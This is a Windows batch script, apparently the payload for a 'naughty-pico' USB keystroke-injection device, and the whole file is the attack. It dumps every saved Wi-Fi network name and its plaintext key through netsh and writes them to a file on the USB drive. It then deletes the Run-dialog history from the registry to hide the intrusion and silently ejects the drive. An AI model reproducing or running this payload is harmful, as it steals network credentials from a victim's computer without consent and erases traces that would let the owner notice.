@echo off && cls
::Begin of payload

 ::Scrape wifi info example
 setlocal enabledelayedexpansion
 (for /f "skip=9 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do (
     set "ssid=%%j"
     set "ssid=!ssid:~1!"  :: remove leading space

     for /f "tokens=2 delims=:" %%k in ('netsh wlan show profile name^="!ssid!"  key^=clear ^| findstr /C:"Key Content"') do (
         set "key=%%k"
         set "key=!key:~1!"
         echo !ssid!{seperator}!key!
     )
 )) > %~d0\naughty-pico\wifi_keys.txt
 ::End of scrape wifi info example

::End of payload

::Clear WIN + R buffer
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
::

::Eject naughty-pico
mountvol %~d0 /p >nul 2>&1
::

exit